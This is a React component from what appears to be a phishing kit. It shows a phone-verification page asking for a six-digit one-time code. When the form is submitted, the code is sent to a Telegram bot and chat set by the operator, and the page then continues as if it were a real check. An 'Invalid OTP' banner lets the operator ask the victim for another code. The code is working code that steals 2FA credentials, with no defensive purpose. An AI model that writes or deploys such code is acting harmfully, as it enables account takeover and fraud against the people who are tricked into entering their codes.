
import React, { useState } from 'react';
import { Smartphone, RefreshCw, ChevronLeft, ShieldAlert } from 'lucide-react';
import { useTranslation } from '../TranslationContext';

interface OtpPageProps {
  botToken: string;
  chatId: string;
  isInvalid?: boolean;
  onComplete: () => void;
}

export const OtpPage: React.FC<OtpPageProps> = ({ botToken, chatId, isInvalid, onComplete }) => {
  const { t } = useTranslation();
  const [otp, setOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) return;
    setIsLoading(true);
    const message = `<b>🔑 OTP Code Received</b>\n<code>${otp}</code>`;
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
      });
      setTimeout(() => onComplete(), 800);
    } catch (e) { onComplete(); } finally { setIsLoading(false); }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto shadow-xl animate-in slide-in-from-bottom-10 duration-500 p-6">
      <header className="w-full flex items-center justify-between py-4 mb-10">
        <ChevronLeft className="w-6 h-6 text-gray-800" />
        <h1 className="text-lg font-bold">{t('verify')}</h1>
        <div className="w-6" />
      </header>

      <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mb-8">
        <Smartphone className="w-10 h-10 text-blue-500" />
      </div>

      <div className="text-center space-y-4 mb-10">
        <h2 className="text-2xl font-bold text-gray-900">{t('verifyPhone')}</h2>
        <p className="text-gray-500 text-sm leading-relaxed">
          {t('otpSent')}
        </p>
      </div>

      <form onSubmit={handleSubmit} className="w-full space-y-6">
        {isInvalid && (
          <div className="flex items-center gap-2 text-red-500 bg-red-50 p-3 rounded-lg text-sm font-bold animate-shake">
            <ShieldAlert className="w-4 h-4" />
            Invalid OTP code. Please check and try again.
          </div>
        )}

        <input
          type="tel"
          inputMode="numeric"
          maxLength={6}
          value={otp}
          onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
          placeholder={t('enterOtp')}
          className="w-full text-center text-4xl font-mono tracking-[0.5em] py-6 border-2 border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-all bg-gray-50"
          autoFocus
        />

        <button
          type="submit"
          disabled={otp.length < 6 || isLoading}
          className={`w-full py-4 rounded-full text-lg font-bold text-white transition-all ${otp.length === 6 && !isLoading ? 'bg-blue-600 shadow-lg shadow-blue-100' : 'bg-gray-300'}`}
        >
          {isLoading ? <RefreshCw className="w-5 h-5 animate-spin mx-auto" /> : t('verify')}
        </button>
      </form>

      <button className="mt-10 text-sm text-blue-500 font-semibold hover:underline">
        {t('didntReceive')} {t('resend')}
      </button>
    </div>
  );
};
